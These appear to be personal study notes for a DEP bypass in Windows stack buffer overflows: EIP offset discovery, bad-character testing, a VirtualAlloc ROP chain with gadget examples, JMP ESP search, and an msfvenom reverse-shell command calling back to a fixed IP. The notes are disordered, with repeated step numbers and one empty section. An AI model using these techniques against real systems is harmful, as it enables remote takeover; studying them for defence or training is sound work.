# DEP Bypass

1. **Start by Building a Script that Causes a Crash**
    - Create a script in the desired language (e.g., Python) to send input to the vulnerable application and observe if it crashes. This is the initial step to confirm that the application is indeed vulnerable.

2. **Find EIP Location**
    - Use Metasploit Framework (msf) to create and find patterns.
        - `msf-pattern_create -l <length>`: Generates a unique pattern of a specified length.
        - `msf-pattern_offset -l <length> -q <EIP>`: Finds the offset of the EIP within the pattern.

3. **Overwrite ESP and Check Storage Capacity**
    - After finding the EIP offset, overwrite the ESP to ensure there is enough space to run the shellcode.
        - Use Windbg commands to check memory locations:
            - `dds esp -10 L10`: Dumps 10 DWORDs before the ESP.
            - `dds esp L4`: Dumps 4 DWORDs from the ESP.
            - `dds esp LN`: Continuously dump until you find the end of the allocated space.
            - `? final_addr - start_addr`: Calculate the available space.
        - If there isn't enough space in the ESP, check other registers like ECX:
            - `dds ecx -10 L10`: Dumps 10 DWORDs before the ECX.
            - `dds ecx L4`: Dumps 4 DWORDs from the ECX.
            - `dds ecx LN`: Continuously dump until you find the end of the allocated space.
            - `? final_addr - start_addr`: Calculate the available space.

4. **Check for Bad Characters**
    - Identify characters that might cause issues within the shellcode. Bad characters can interrupt the execution of the payload.
    - Test in chunks if necessary.
    - Example bad characters list:
      ```python
      badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
      )
      ```
    - Windbg command to check bad characters:
        - `db esp -10 L20`: Dump 20 bytes before the ESP.
        - Be cautious of bytes that might not break other bytes but can break themselves.

5. **Locate Gadgets**
    - Use rp-lin. you may have to `lm m module` to check if it doesn't have null values. 
    - Let's start by placing dummy values for the main VirtualAlloc cal:
    ```
    va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
    va += pack("<L", (0x46464646)) # Shellcode Return Address
    va += pack("<L", (0x47474747)) # # dummy Shellcode Address
    va += pack("<L", (0x48484848)) # dummy dwSize 
    va += pack("<L", (0x49494949)) # # dummy flAllocationType 
    va += pack("<L", (0x51515151)) # dummy flProtect
    ```
    - ensure that you place these as part of the offset before the eip.
    - At this point you should calculate how much we need to subtract/add negative number to get to virtualalloc address.
6. **Making ROP's Acquaintance**
    - Basically we need to find a ROP chain that allows us to copy ESP somewhere else. IDEALLY EAX, ECX
    - EX: `0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret`
7. **Getting VirtualAlloc Address**
    - We do this by opening IDA on the module we are using and looking for it in the imports section, that gives us the IAT address.
    - With a way to resolve the address of VirtualAlloc, we must understand how to use it. In the previous step, we placed a dummy value (0x45454545) on the stack for this API address as part of our buffer overflow, which we need to overwrite.
    - To do this overwrite, we will need to perform three tasks with our ROP gadgets. First, locate the address on the stack where the dummy DWORD is. Second, we need to resolve the address of VirtualAlloc. Finally, we need to write that value on top of the placeholder value.
    - If not in EAX/ECX, get there. Use rop to get there.
    - Now we need to find a rop that will allow us to put -0x1C into the other register so if you put it in EAX then you need to put -0x1C in ECX and vice versa. The value 1C is 28 bytes so it depends also.
    - Next we will add them together/ subtract if its still positive.
    - then move eax back to esi/ebp basically away from eax/ecx.
    - Next pop eax or ecx and put VirtualAlloc inside of it. in case we have a bad char we may need to add 1 to it, then pop the other ecx/eax a -1 in there and finally add them.
    - Finally, we can use a dereference to move the address of VirtualAlloc into EAX through a MOV EAX, DWORD [EAX] instruction.
    - Okay I lied not finally, then we have to patch the address by moving it over to esi or ebp or whatever dummy register is holding our data: `mov dword [esi], eax ; ret`

8. **Patching the Return Address**
    - At this point we should only be 4 bytes below where we need to be, so we can do add esi, 0x04 but that likely doesn't exist so we can also try to increment.
    - `rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret` x 4
    - First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI, since we need it there to patch the placeholder value. An instruction like "MOV EAX, ESI" is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used "PUSH EAX ; POP ESI ; RET" gadget.
  
8. ** Patching Arguments**
    -     

   
5. **Find JMP ESP or ECX**
    - Use a tool like Process Hacker to find a JMP ESP or ECX instruction that doesn't contain null bytes. You can also try CALL ESP, ECX.
        - `s -b first_addr final_addr 0xff 0xe4`: Search for the opcode for JMP ESP (0xFFE4) within the address range.
        - If you need to use ECX, find a JMP ECX instruction:
            - `s -b first_addr final_addr 0xff 0xe1`: Search for the opcode for JMP ECX (0xFFE1) within the address range.

6. **Generate Shellcode**
    - Use msfvenom to generate the shellcode for a reverse TCP shell:
        ```bash
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=443 EXITFUNC=thread -f python -v shellcode –e x86/shikata_ga_nai -b "\x00"
        ```
    - Ensure the shellcode does not contain bad characters and is encoded appropriately.

7. **Don’t Forget NOP Sled**
    - Include NOP (No Operation) instructions to increase the reliability of the shellcode execution.
    - Typically, a series of 0x90 bytes (NOPs) are added before the shellcode to create a "NOP sled."
